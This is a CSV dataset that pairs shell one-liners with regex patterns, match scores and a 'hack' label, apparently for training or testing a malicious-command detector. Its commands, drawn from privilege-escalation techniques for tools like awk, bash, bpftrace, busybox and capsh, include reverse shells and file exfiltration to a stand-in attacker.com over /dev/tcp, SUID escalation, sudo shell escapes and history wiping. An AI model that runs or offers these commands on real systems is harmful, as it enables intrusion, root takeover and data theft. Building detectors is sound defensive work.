ocode,code,word_count,match_count,match_score,hack
sudo install -m =xs $(which arp) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which arp\) \.",7,1,0.7714285714285715,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./arp -v -f ""$LFILE""","\./arp -v -f ""\$LFILE""",4,0,0.09523809523809523,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo arp -v -f ""$LFILE""","sudo arp -v -f ""\$LFILE""",5,0,0.041666666666666664,0
ash,ash,1,0,0.0,0
export LFILE=file_to_write,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1481481481481481,0
ash -c 'echo DATA > $LFILE',"ash -c [\'|""]| -e [\'|""]|cat >.*<<.*echo DATA > \$LFILE'",6,1,1.0357142857142858,0
sudo install -m =xs $(which ash) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ash\) \.",7,1,0.7714285714285715,0
./ash,\./ash,1,0,0.16666666666666666,0
sudo ash,sudo ash,2,0,0.0,0
"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null","echo ""/bin/sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)"" \| at now\; tail -f /dev/null",11,0,0.16176470588235295,1
COMMAND=id,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.8181818181818183,0
"echo ""$COMMAND"" | at now","echo ""\$COMMAND"" \| at now",5,0,0.08,0
"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null","echo ""/bin/sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)"" \| sudo at now\; tail -f /dev/null",12,0,0.1506849315068493,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","atobm \$LFILE 2>&1 \| awk -F ""'"" '{printf ""%s""\, \$2}'",10,0,0.0784313725490196,0
sudo install -m =xs $(which atobm) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which atobm\) \.",7,1,0.7297297297297297,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","\./atobm \$LFILE 2>&1 \| awk -F ""'"" '{printf ""%s""\, \$2}'",10,0,0.09433962264150944,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","sudo atobm \$LFILE 2>&1 \| awk -F ""'"" '{printf ""%s""\, \$2}'",11,0,0.07142857142857142,0
"awk 'BEGIN {system(""/bin/sh"")}'","awk 'BEGIN {system\(""/bin/sh""\)}'",3,0,0.0625,1
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {,awk -v [\w\-_]+=\$RHOST -v [\w\-_]+=\$RPORT 'BEGIN {,7,2,0.4,0
"    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;","s =[ a-z0-9\.\-\/\'\""_\@]+RHOST ""/"" RPORT\;",10,1,0.6,0
"    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;","while \(1\) {printf ""> "" \|& s\; if \(\(s \|& getline c\) <=[ a-z0-9\.\-\/\'\""_\@]+\) break\;",19,1,0.5223880597014925,0
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}',while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}',17,0,0.2222222222222222,0
LPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
awk -v LPORT=$LPORT 'BEGIN {,awk -v [\w\-_]+=\$LPORT 'BEGIN {,5,1,0.3103448275862069,0
"    s = ""/inet/tcp/"" LPORT ""/0/0"";","s =[ a-z0-9\.\-\/\'\""_\@]+LPORT ""/0/0""\;",9,1,0.6857142857142857,0
"    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;","while \(1\) {printf ""> "" \|& s\; if \(\(s \|& getline c\) <=[ a-z0-9\.\-\/\'\""_\@]+\) break\;",19,1,0.5223880597014925,0
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}',while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}',17,0,0.2222222222222222,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","awk -v [\w\-_]+=\$LFILE 'BEGIN { print ""DATA"" > LFILE }'",10,1,0.16981132075471697,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"awk '//' ""$LFILE""","awk '//' ""\$LFILE""",3,0,0.05555555555555555,0
sudo install -m =xs $(which awk) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which awk\) \.",7,1,0.7714285714285715,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./awk '//' ""$LFILE""","\./awk '//' ""\$LFILE""",3,0,0.1,0
"sudo awk 'BEGIN {system(""/bin/sh"")}'","sudo awk 'BEGIN {system\(""/bin/sh""\)}'",4,0,0.05405405405405406,1
sudo install -m =xs $(which awk) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which awk\) \.",7,1,0.7714285714285715,0
"./awk 'BEGIN {system(""/bin/sh"")}'","\./awk 'BEGIN {system\(""/bin/sh""\)}'",3,0,0.08823529411764706,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"base32 ""$LFILE"" | base32 --decode","base32 ""\$LFILE"" \| base32 --decode",5,0,0.058823529411764705,0
sudo install -m =xs $(which base32) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which base32\) \.",7,1,0.7105263157894737,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"base32 ""$LFILE"" | base32 --decode","base32 ""\$LFILE"" \| base32 --decode",5,0,0.058823529411764705,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo base32 ""$LFILE"" | base32 --decode","sudo base32 ""\$LFILE"" \| base32 --decode",6,0,0.05128205128205128,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"base64 ""$LFILE"" | base64 --decode","base64 ""\$LFILE"" \| base64 --decode",5,0,0.058823529411764705,0
sudo install -m =xs $(which base64) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which base64\) \.",7,1,0.7105263157894737,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./base64 ""$LFILE"" | base64 --decode","\./base64 ""\$LFILE"" \| base64 --decode",5,0,0.08333333333333333,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo base64 ""$LFILE"" | base64 --decode","sudo base64 ""\$LFILE"" \| base64 --decode",6,0,0.05128205128205128,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
basenc --base64 $LFILE | basenc -d --base64,basenc --base64 \$LFILE \| basenc -d --base64,7,0,0.045454545454545456,0
sudo install -m =xs $(which basenc) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which basenc\) \.",7,1,0.7105263157894737,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
basenc --base64 $LFILE | basenc -d --base64,basenc --base64 \$LFILE \| basenc -d --base64,7,0,0.045454545454545456,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo basenc --base64 $LFILE | basenc -d --base64,sudo basenc --base64 \$LFILE \| basenc -d --base64,8,0,0.04081632653061224,0
bash,bash,1,0,0.0,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1',"bash -c [\'|""]| -e [\'|""]|cat >.*<<.*exec bash -i &>/dev/tcp/\$RHOST/\$RPORT <&1'",7,1,0.5769230769230769,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"bash -c 'echo -e ""POST / HTTP/0.9/n/n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'","bash -c [\'|""]| -e [\'|""]|cat >.*<<.*echo -c [\'|""]| -e [\'|""]|cat >.*<<.*POST / HTTP/0\.9/n/n\$\(<\$LFILE\)"" > /dev/tcp/\$RHOST/\$RPORT'",9,2,0.84,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',"bash -c [\'|""]| -e [\'|""]|cat >.*<<.*cat \$LFILE > /dev/tcp/\$RHOST/\$RPORT'",6,1,0.6739130434782609,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.2,0
"bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0/r/nhost: $RHOST/r/n/r/n"" 1>&3; cat 0<&3; } /    3<>/dev/tcp/$RHOST/$RPORT /    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""/r"")"" ] && break; done; cat; } > $LFILE'","bash -c [\'|""]| -e [\'|""]|cat >.*<<.*{ echo -ne ""GET /\$LFILE HTTP/1\.0/r/nhost: \$RHOST/r/n/r/n"" 1>&3\; cat 0<&3\; } /    3<>/dev/tcp/\$RHOST/\$RPORT /    \| { while read -r\; do  ""\$REPLY"" =[ a-z0-9\.\-\/\'\""_\@]+\$\(echo -ne ""/r""\)""  && break\; done\; cat\; } > \$LFILE'",42,2,0.3173076923076923,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.2,0
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',"bash -c [\'|""]| -e [\'|""]|cat >.*<<.*cat < /dev/tcp/\$RHOST/\$RPORT > \$LFILE'",7,1,0.6458333333333334,1
export LFILE=file_to_write,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1481481481481481,0
bash -c 'echo DATA > $LFILE',"bash -c [\'|""]| -e [\'|""]|cat >.*<<.*echo DATA > \$LFILE'",6,1,1.0,1
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
HISTIGNORE='history *',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\*'",2,2,1.391304347826087,0
history -c,history -c,2,0,0.0,0
DATA,DATA,1,0,0.0,0
history -w $LFILE,history -w \$LFILE,3,0,0.05555555555555555,0
export LFILE=file_to_read,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"bash -c 'echo ""$(<$LFILE)""'","bash -c [\'|""]| -e [\'|""]|cat >.*<<.*echo ""\$\(<\$LFILE\)""'",4,1,1.1428571428571428,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
HISTTIMEFORMAT=$'/r/e[K',[\w\-_]+=\$'/r/eK',1,1,0.625,0
history -r $LFILE,history -r \$LFILE,3,0,0.05555555555555555,0
history,history,1,0,0.0,0
bash -c 'enable -f ./lib.so x',"bash -c [\'|""]| -e [\'|""]|cat >.*<<.*enable -f \./lib\.so x'",6,1,0.967741935483871,1
sudo install -m =xs $(which bash) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which bash\) \.",7,1,0.75,1
./bash -p,\./bash -p,2,0,0.1,1
sudo bash,sudo bash,2,0,0.0,1
"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'","sudo bpftrace -c [\'|""]| -e [\'|""]|cat >.*<<.*BEGIN {system\(""/bin/sh""\)\;exit\(\)}'",5,1,0.6346153846153846,1
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF","echo 'BEGIN {system\(""/bin/sh""\)\;exit\(\)}' >\$TF",4,0,0.13333333333333333,1
sudo bpftrace $TF,sudo bpftrace \$TF,3,0,0.05555555555555555,0
sudo bpftrace -c /bin/sh -e 'END {exit()}',"sudo bpftrace -c /bin/sh -c [\'|""]| -e [\'|""]|cat >.*<<.*END {exit\(\)}'",7,1,0.6976744186046512,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"bridge -b ""$LFILE""","bridge -b ""\$LFILE""",3,0,0.05263157894736842,0
sudo install -m =xs $(which bridge) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which bridge\) \.",7,1,0.7105263157894737,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./bridge -b ""$LFILE""","\./bridge -b ""\$LFILE""",3,0,0.09523809523809523,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo bridge -b ""$LFILE""","sudo bridge -b ""\$LFILE""",4,0,0.041666666666666664,0
bundler help,bundler help,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
export BUNDLE_GEMFILE=x,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.3333333333333333,0
bundler exec /bin/sh,bundler exec /bin/sh,3,0,0.0,1
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
touch $TF/Gemfile,touch \$TF/Gemfile,2,0,0.05555555555555555,0
cd $TF,cd \$TF,2,0,0.14285714285714285,0
bundler exec /bin/sh,bundler exec /bin/sh,3,0,0.0,1
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
touch $TF/Gemfile,touch \$TF/Gemfile,2,0,0.05555555555555555,0
cd $TF,cd \$TF,2,0,0.14285714285714285,0
bundler console,bundler console,2,0,0.0,0
system('/bin/sh -c /bin/sh'),system\('/bin/sh -c /bin/sh'\),3,0,0.06896551724137931,1
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo 'system(""/bin/sh"")' > $TF/Gemfile","echo 'system\(""/bin/sh""\)' > \$TF/Gemfile",4,0,0.07692307692307693,1
cd $TF,cd \$TF,2,0,0.14285714285714285,0
bundler install,bundler install,2,0,0.0,0
sudo bundler help,sudo bundler help,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
busctl --show-machine,busctl --show-machine,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo busctl --show-machine,sudo busctl --show-machine,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
busybox sh,busybox sh,2,0,0.0,0
LPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
busybox httpd -f -p $LPORT -h .,busybox httpd -f -p \$LPORT -h \.,7,0,0.0625,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"busybox sh -c 'echo ""DATA"" > $LFILE'","busybox sh -c [\'|""]| -e [\'|""]|cat >.*<<.*echo ""DATA"" > \$LFILE'",7,1,0.7837837837837838,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./busybox cat ""$LFILE""","\./busybox cat ""\$LFILE""",3,0,0.08695652173913043,0
sudo install -m =xs $(which busybox) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which busybox\) \.",7,1,0.6923076923076923,0
./busybox sh,\./busybox sh,2,0,0.07692307692307693,0
sudo busybox sh,sudo busybox sh,3,0,0.0,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'system(""/bin/sh"")' > $TF","echo 'system\(""/bin/sh""\)' > \$TF",4,0,0.0967741935483871,1
byebug $TF,byebug \$TF,2,0,0.09090909090909091,0
continue,continue,1,0,0.0,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'system(""/bin/sh"")' > $TF","echo 'system\(""/bin/sh""\)' > \$TF",4,0,0.0967741935483871,1
sudo byebug $TF,sudo byebug \$TF,3,0,0.0625,0
continue,continue,1,0,0.0,0
sudo install -m =xs $(which byebug) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which byebug\) \.",7,1,0.7105263157894737,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'system(""/bin/sh"")' > $TF","echo 'system\(""/bin/sh""\)' > \$TF",4,0,0.0967741935483871,1
./byebug $TF,\./byebug \$TF,2,0,0.15384615384615385,0
continue,continue,1,0,0.0,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT","cancel -u ""\$\(cat \$LFILE\)"" -h \$RHOST:\$RPORT",6,0,0.13953488372093023,0
capsh --,capsh --,2,0,0.0,0
sudo install -m =xs $(which capsh) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which capsh\) \.",7,1,0.7297297297297297,0
./capsh --gid=0 --uid=0 --,"\./capsh [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+=[ a-z0-9\.\-\/\'\""_\@]+",4,3,1.7777777777777777,0
sudo capsh --,sudo capsh --,3,0,0.0,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"cat ""$LFILE""","cat ""\$LFILE""",2,0,0.07692307692307693,0
sudo install -m =xs $(which cat) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which cat\) \.",7,1,0.7714285714285715,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./cat ""$LFILE""","\./cat ""\$LFILE""",2,0,0.13333333333333333,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo cat ""$LFILE""","sudo cat ""\$LFILE""",3,0,0.05555555555555555,0
"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","check_by_ssh -o ""ProxyCommand /bin/sh -i <\$\(tty\) \|& tee \$\(tty\)"" -H localhost -C xx",13,0,0.08433734939759036,1
"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <\$\(tty\) \|& tee \$\(tty\)"" -H localhost -C xx",14,0,0.07954545454545454,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
check_cups --extra-opts=@$LFILE,"check_cups [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$LFILE",2,2,0.90625,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo check_cups --extra-opts=@$LFILE,"sudo check_cups [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$LFILE",3,2,0.7837837837837838,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
INPUT=input_file,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.7647058823529411,0
check_log -F $INPUT -O $LFILE,check_log -F \$INPUT -O \$LFILE,5,0,0.06666666666666667,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
OUTPUT=output_file,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
